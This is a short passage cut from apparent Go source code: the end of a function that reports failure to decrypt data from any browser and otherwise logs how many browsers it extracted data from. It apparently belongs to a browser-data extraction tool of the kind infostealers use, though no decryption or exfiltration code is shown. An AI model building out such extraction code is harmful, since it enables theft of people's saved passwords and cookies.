		return fmt.Errorf("failed to decrypt data from any browser: %v", lastError)
	}
	
	log.Printf("[+] Successfully extracted data from %d browser(s)", successCount)
	return nil
}
